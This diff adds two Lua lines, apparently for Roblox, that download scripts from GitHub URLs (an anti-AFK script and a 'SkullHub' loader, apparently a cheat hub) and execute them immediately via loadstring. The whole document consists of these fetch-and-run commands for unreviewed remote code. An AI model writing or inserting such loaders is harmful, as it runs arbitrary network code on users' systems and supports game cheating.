@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BKProsYT/antiafk/main/antiafkscript", true))()
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/zicus-scripts/SkullHub/main/Loader.lua')))()
